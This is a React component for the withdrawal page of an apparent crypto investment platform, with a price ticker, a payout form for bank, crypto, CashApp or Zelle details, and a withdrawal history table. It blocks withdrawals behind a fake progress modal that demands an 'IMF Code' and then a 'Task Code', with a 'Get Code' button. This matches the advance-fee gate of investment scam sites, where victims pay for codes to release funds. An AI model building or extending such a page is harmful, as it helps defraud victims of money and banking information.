import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import styles from './Withdraw.module.css';
import Sidebar from '../components/MobileSideBar';
import DesktopSideBar from '../components/DesktopSideBar';
import AuthModal from '../Modal/AuthModal';
import BackHeader from '../components/DashboardHeader';
import 'aos/dist/aos.css';
import AOS from 'aos';
import { useDispatch, useSelector } from 'react-redux';
import { Spinner } from 'react-activity';
import { createWithdraw, fetchWithdraw } from '../store/action/appStorage';
import MultiCoinChart from './Chart';
import { FaArrowDown } from 'react-icons/fa';




const Withdraw = () => {
  const [loading, setLoading] = useState(true);
  const [isAuthError, setIsAuthError] = useState(false);
  const [authInfo, setAuthInfo] = useState('');
  const [cryptoData, setCryptoData] = useState([]);
  const [withdrawals, setWithdrawals] = useState([]);

  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState('');

  // dynamic fields
  const [accountName, setAccountName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [bankName, setBankName] = useState('');
  const [bitcoinAddress, setBitcoinAddress] = useState('');
  const [etheriumAddress, setEtheriumAddress] = useState('');
  const [cashappAddress, setCashappAddress] = useState('');
  const [zelleAddress, setZelleAddress] = useState('');

  const [sidebarOpen, setSidebarOpen] = useState(false);

  const dispatch = useDispatch();
  const { user } = useSelector(state => state.userAuth);
  const navigate = useNavigate();

  const [withdrawModal, setWithdrawModal] = useState({
    open: false,
    progress: 25,
    title: "",
    label: "",
    placeholder: "",
    value: "",
    error: 'an error on the server',
    codeType: ''
  });

  const openMobileMenu = () => {
    setSidebarOpen(prev => !prev);
  };

  useEffect(() => {
    AOS.init({ duration: 1000, once: true });

    const fetchCryptoData = async () => {
      try {
        const res = await fetch(
          'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false'
        );
        const data = await res.json();
        setCryptoData(data ?? []);
      } catch (error) {
        console.error('Error fetching crypto data:', error);
      }
    };
    fetchCryptoData();
  }, []);

  const handleWithdraw = async () => {
    if (loading) return;
    if (!amount || !method) {
      setAuthInfo('Please fill in required fields');
      setIsAuthError(true);
      return;
    }

    if (!user?.accountStatus) {
      setAuthInfo('Account not yet verified');
      setIsAuthError(true);
      return;
    }

    if (Number(user?.availableBalance ?? 0) < Number(amount)) {
      setAuthInfo('Insufficient fund');
      setIsAuthError(true);
      return;
    }
    if (!user?.isImfCodeVerified) {
      return setWithdrawModal({
        open: true,
        progress: 25,
        title: "Use the IMF Code given to you to proceed",
        label: "IMF Code",
        placeholder: "Enter IMF Code",
        value: "",
        codeType: 'imf',
      });
    }

    if (!user?.isTaskCodeVerified) {
      return setWithdrawModal({
        open: true,
        progress: 50,
        title: "Enter your Task Code to continue",
        label: "Task Code",
        placeholder: "Enter Task Code",
        value: "",
        codeType: 'task',
      });
    }

    // if everything is enterd... then proceed
    let data = {
      amount,
      method,
      user,
      account_name: accountName,
      account_number: accountNumber,
      bank_name: bankName,
      bitcoin_address: bitcoinAddress,
      etherium_address: etheriumAddress,
      cashapp_address: cashappAddress,
      zelle_address: zelleAddress,
    };

    try {
      setLoading(true);
      const res = await dispatch(createWithdraw(data));
      if (!res?.bool) {
        setIsAuthError(true);
        return setAuthInfo(res?.message ?? 'Withdrawal failed');
      }

      setIsAuthError(true);
      setWithdrawals(res?.message ?? []);
      setAuthInfo("Withdrawal initiated.");
      setLoading(false);
      fetchWithdrawHandler();

      // ✅ Clear all input fields
      setAmount('');
      setMethod('');
      setAccountName('');
      setAccountNumber('');
      setBankName('');
      setBitcoinAddress('');
      setEtheriumAddress('');
      setCashappAddress('');
      setZelleAddress('');
    } catch (error) {
      setIsAuthError(true);
      setAuthInfo(error.message);
      setLoading(false);
    }
  };

  const codeHandler = async () => {
    const enteredCode = withdrawModal.value?.trim();

    if (!enteredCode) {
      return setWithdrawModal(prev => ({
        ...prev,
        error: "Please enter a code"
      }));
    }



    // IMF CODE
    if (withdrawModal.codeType === "imf") {
      if (enteredCode !== user?.imfCode) {
        return setWithdrawModal(prev => ({
          ...prev,
          error: "Invalid IMF Code"
        }));
      }

      // update redux user state
      dispatch({
        type: "UPDATE_USER",
        payload: {
          ...user,
          isImfCodeVerified: true
        }
      });

      setWithdrawModal({
        open: true,
        progress: 50,
        title: "Enter your Task Code to continue",
        label: "Task Code",
        placeholder: "Enter Task Code",
        value: "",
        error: "",
        codeType: "task"
      });

      return;
    }

    // TASK CODE
    if (withdrawModal.codeType === "task") {
      if (enteredCode !== user?.taskCode) {
        return setWithdrawModal(prev => ({
          ...prev,
          error: "Invalid Task Code"
        }));
      }

      dispatch({
        type: "UPDATE_USER",
        payload: {
          ...user,
          isTaskCodeVerified: true
        }
      });

      setWithdrawModal(prev => ({
        ...prev,
        open: false,
        error: "",
        value: ""
      }));

      setAuthInfo("Task Code verified successfully");
      setIsAuthError(true);

      return;
    }

  };


  const fetchWithdrawHandler = async () => {
    try {
      setLoading(true);
      const res = await dispatch(fetchWithdraw({ user }));
      if (!res?.bool) {
        setAuthInfo(res?.message ?? 'Failed to fetch withdrawals');
        setIsAuthError(true);
        setLoading(false);
        return;
      }
      setWithdrawals(res?.message ?? []);
      setLoading(false);
    } catch (err) {
      setAuthInfo(err.message);
      setIsAuthError(true);
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchWithdrawHandler();
  }, []);

  const updateAuthError = () => {
    setIsAuthError(false);
    setAuthInfo('');
  };

  const navigateMobileHandler = (url) => {
    return navigate(`/${url}`);
  };

  const notificationHandler = () => {
    navigate('/notifications');
  };

  return (
    <>
      {isAuthError && (
        <AuthModal
          modalVisible={isAuthError}
          updateVisibility={updateAuthError}
          message={authInfo}
        />
      )}

      <div className={styles.dashboard}>
        <div className={styles.leftSection}>
          <DesktopSideBar
            isInvest={true}
            navigateMobileHandler={navigateMobileHandler}
          />
        </div>

        {/* Sidebar content */}
        {sidebarOpen && (
          <Sidebar
            isOpen={sidebarOpen}
            onClose={() => setSidebarOpen(false)}
            isInvest={true}
            navigateMobileHandler={navigateMobileHandler}
          />
        )}

        <div className={styles.mainSection}>
          <BackHeader
            openMobileMenu={openMobileMenu}
            notificationHandler={notificationHandler}
            sidebarOpen={sidebarOpen}
            title='Withdraw Fund'
          />

          <div className={styles.tickerTape} style={{ margin: '0 10px' }}>
            <div className={styles.tickerInner}>
              {(cryptoData ?? []).map((coin, index) => (
                <div key={index} className={styles.tickerItem}>
                  <img
                    src={coin?.image ?? ''}
                    alt={coin?.name ?? 'coin'}
                    className={styles.coinIcon}
                  />
                  <span className={styles.coinName}>
                    {(coin?.symbol ?? '').toUpperCase()}
                  </span>
                  <span
                    className={
                      (coin?.price_change_percentage_24h ?? 0) >= 0
                        ? styles.priceUp
                        : styles.priceDown
                    }
                  >
                    ${((coin?.current_price ?? 0)).toFixed(2)} (
                    {((coin?.price_change_percentage_24h ?? 0)).toFixed(2)}%)
                  </span>
                </div>
              ))}
            </div>
          </div>


          {!loading ? (
            <div className={styles.container}>
              <div className={styles.card}>
                <div className={styles.formGroup}>
                  <input
                    type="number"
                    placeholder="Enter amount in dollars"
                    className={styles.input}
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                  />
                </div>

                <div className={styles.formGroup}>
                  <select
                    className={styles.select}
                    value={method}
                    onChange={(e) => setMethod(e.target.value)}
                  >
                    <option value="">Receive Payment through</option>
                    <option value="bank">Bank</option>
                    <option value="bitcoin">Bitcoin</option>
                    <option value="etherium">Ethereum</option>
                    <option value="cashapp">CashApp</option>
                    <option value="zelle">Zelle</option>
                  </select>
                </div>

                {method === 'bank' && (
                  <>
                    <div className={styles.formGroup}>
                      <input
                        placeholder="Account Name"
                        className={styles.input}
                        value={accountName}
                        onChange={(e) => setAccountName(e.target.value)}
                      />
                    </div>

                    <div className={styles.formGroup}>
                      <input
                        placeholder="Account Number"
                        className={styles.input}
                        value={accountNumber}
                        onChange={(e) => setAccountNumber(e.target.value)}
                      />
                    </div>

                    <div className={styles.formGroup}>
                      <input
                        placeholder="Bank Name"
                        className={styles.input}
                        value={bankName}
                        onChange={(e) => setBankName(e.target.value)}
                      />
                    </div>
                  </>
                )}

                {method === 'bitcoin' && (
                  <div className={styles.formGroup}>
                    <input
                      placeholder="Bitcoin Address"
                      className={styles.input}
                      value={bitcoinAddress}
                      onChange={(e) => setBitcoinAddress(e.target.value)}
                    />
                  </div>
                )}

                {method === 'etherium' && (
                  <div className={styles.formGroup}>
                    <input
                      placeholder="Ethereum Address"
                      className={styles.input}
                      value={etheriumAddress}
                      onChange={(e) => setEtheriumAddress(e.target.value)}
                    />
                  </div>
                )}

                {method === 'cashapp' && (
                  <div className={styles.formGroup}>
                    <input
                      placeholder="CashApp Username"
                      className={styles.input}
                      value={cashappAddress}
                      onChange={(e) => setCashappAddress(e.target.value)}
                    />
                  </div>
                )}

                {method === 'zelle' && (
                  <div className={styles.formGroup}>
                    <input
                      placeholder="Zelle Email or Phone"
                      className={styles.input}
                      value={zelleAddress}
                      onChange={(e) => setZelleAddress(e.target.value)}
                    />
                  </div>
                )}

                <button className={styles.button} onClick={handleWithdraw}>
                  Withdraw
                </button>
              </div>

              <div className={styles.historyCard}>
                <h3 className={styles.sectionTitle}>Withdraw history</h3>
                {(withdrawals ?? []).length === 0 ? (
                  <p className={styles.emptyText}>No withdrawals found.</p>
                ) : (
                  <div className={styles.tableWrapper}>
                    <table className={styles.tradeTable}>
                      <thead>
                        <tr>
                          <th>ID</th>
                          <th>Date</th>
                          <th>Amount</th>
                          <th>Method</th>
                          <th>Status</th>
                        </tr>
                      </thead>
                      <tbody>
                        {(withdrawals ?? []).map((item, index) => (
                          <tr key={item?._id || index}>
                            <td>#{index + 1}</td>
                            <td>
                              {item?.date
                                ? new Date(item.date).toLocaleDateString()
                                : 'N/A'}
                            </td>
                            <td>{item?.amount ?? 0}</td>
                            <td
                              style={{
                                color: '#10B981',
                                fontWeight: 'bold',
                              }}
                            >
                              {item?.method ?? 'N/A'}
                            </td>
                            <td
                              style={{
                                color:
                                  item?.status === 'Pending'
                                    ? '#EF4444'
                                    : '#10B981',
                                fontWeight: 'bold',
                              }}
                            >
                              {item?.status == "active" ? 'successful' : item?.status}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div
              style={{
                width: '100%',
                height: '300px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                paddingBottom: '20px',
              }}
            >
              <Spinner
                size={24}
                color="#4F46E5"
                speed={0.5}
                animating={true}
              />
            </div>
          )}


          <div className={styles.tradeSummaryCard} style={{ background: 'transparent', display: 'flex', justifyContent: 'center' }}>
            <MultiCoinChart />
          </div>

        </div>
      </div>


      {withdrawModal.open && (
        <div className={styles.modalOverlay}>
          <div className={styles.modalCard}>

            <button
              className={styles.closeBtn}
              onClick={() =>
                setWithdrawModal(prev => ({
                  ...prev,
                  open: false
                }))
              }
            >
              ×
            </button>

            <div className={styles.withdrawIcon}>
              <FaArrowDown />
            </div>

            <h3 className={styles.withdrawTitle}>
              Withdrawal Is {withdrawModal.progress}% Complete
            </h3>

            <div className={styles.progressWrapper}>
              <div
                className={styles.progressFill}
                style={{
                  width: `${withdrawModal.progress}%`
                }}
              />
            </div>

            <p className={styles.withdrawText}>
              {withdrawModal.title}
            </p>

            <div className={styles.inputGroup}>
              <label>
                {withdrawModal.label}
              </label>

              <input
                type="text"
                value={withdrawModal.value}
                placeholder={withdrawModal.placeholder}
                className={styles.withdrawInput}
                onChange={(e) =>
                  setWithdrawModal(prev => ({
                    ...prev,
                    value: e.target.value
                  }))
                }
              />
            </div>

            <button
              className={styles.proceedButton}
              onClick={codeHandler}
            >
              Proceed
            </button>
            <span style={{ color: 'red', textAlign: 'center', fontSize: '15px' }}>{withdrawModal.error}</span><br></br>

            <button className={styles.getCodeButton}>
              Get Code
            </button>



          </div>
        </div>
      )}
    </>
  );
};

export default Withdraw;

